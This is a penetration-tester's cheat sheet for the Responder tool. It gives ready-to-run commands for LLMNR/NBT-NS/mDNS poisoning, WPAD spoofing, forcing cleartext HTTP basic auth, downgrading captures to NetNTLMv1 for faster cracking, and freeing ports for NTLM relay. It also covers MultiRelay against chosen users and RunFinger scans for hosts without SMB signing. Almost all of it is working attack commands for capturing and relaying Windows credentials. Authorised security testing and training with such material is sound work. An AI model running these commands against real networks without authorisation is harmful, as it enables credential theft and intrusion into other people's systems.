# Responder

LLMNR / NBT-NS / mDNS poisoner. Sits on a network segment and answers broadcast name-resolution requests, then captures NetNTLMv1/v2 from clients that try to authenticate. Pair with `mitm6.md`, `ntlmrelayx.md`, `coercer.md`.

<!-- cheat
export interface
var interface = printf 'tun0\neth0\nwlan0\n' --- --query tun0 --header "Select interface"
-->

## Responder

### Run

Start Responder with poisoning enabled. Captures NetNTLM hashes from clients that fall back to broadcast resolution.

```sh title:"Poison LLMNR/NBT-NS/MDNS, capture NetNTLM hashes"
sudo responder -I $interface
```
<!-- cheat
import interface
-->

### Analyze mode (passive)

No poisoning - just log incoming broadcast traffic. Use first to understand what's noisy on the segment before going active.

```sh title:"Passive Responder, log broadcasts without poisoning"
sudo responder -I $interface -A
```
<!-- cheat
import interface
-->

### With WPAD

Enable the WPAD proxy auto-config response - tricks browsers into routing HTTP through Responder, exposing more auth opportunities.

```sh title:"Responder + WPAD proxy spoofer for browser auth capture"
sudo responder -I $interface --wpad
```
<!-- cheat
import interface
-->

### Force basic auth (cleartext)

Force HTTP basic-auth dialog when WPAD challenges - sometimes catches users who type creds into a browser popup.

```sh title:"Force HTTP basic auth - sometimes catches typed creds"
sudo responder -I $interface --wpad -b
```
<!-- cheat
import interface
-->

### Force LM downgrade

Coerce captured auth to NetNTLMv1 instead of v2 - v1 cracks dramatically faster on weak passwords or via Crack.sh.

```sh title:"Downgrade captures to NetNTLMv1 (fast crack via Crack.sh)"
sudo responder -I $interface --lm
```
<!-- cheat
import interface
-->

## Responder.conf tweaks

### Disable SMB/HTTP for relay

Disable SMB and HTTP servers in Responder.conf so they don't block ntlmrelayx's listeners (relay needs the ports free).

```sh title:"Disable Responder SMB+HTTP so ntlmrelayx can bind them"
sed -i 's/SMB = On/SMB = Off/g; s/HTTP = On/HTTP = Off/g' /usr/share/responder/Responder.conf
```
<!-- cheat -->

### Re-enable SMB/HTTP

Re-enable both servers after the relay run.

```sh title:"Re-enable Responder SMB+HTTP after relay run"
sed -i 's/SMB = Off/SMB = On/g; s/HTTP = Off/HTTP = On/g' /usr/share/responder/Responder.conf
```
<!-- cheat -->

### Set NTLM challenge

Set the static challenge value Responder uses. Defaults to `1122334455667788` for compatibility with rainbow tables.

```sh title:"Set static NTLM challenge in Responder.conf"
sed -i 's/Challenge =.*$/Challenge = $challenge/g' /usr/share/responder/Responder.conf
```
<!-- cheat
var challenge = printf '%s\n' '1122334455667788' --- --header 'Challenge'
-->

## Responder utilities

### MultiRelay specific users

Run MultiRelay against a target, filtering for specific accounts (requires SMB+HTTP off in Responder.conf so the ports are free).

```sh title:"MultiRelay to single target, only specified accounts"
MultiRelay.py -t $rhost_ip -u $user1 $user2
```
<!-- cheat
import domain_ip
var user1
var user2
-->

### MultiRelay any user

Same MultiRelay but accept any successfully relayed account.

```sh title:"MultiRelay any successfully relayed user"
MultiRelay.py -t $rhost_ip -u ALL
```
<!-- cheat
import domain_ip
-->

### RunFinger SMB signing check

Check whether targets enforce SMB signing - signing-disabled hosts are valid relay targets.

```sh title:"Find SMB-signing-disabled hosts (relay targets)"
RunFinger.py -i $cidr
```
<!-- cheat
var cidr
-->
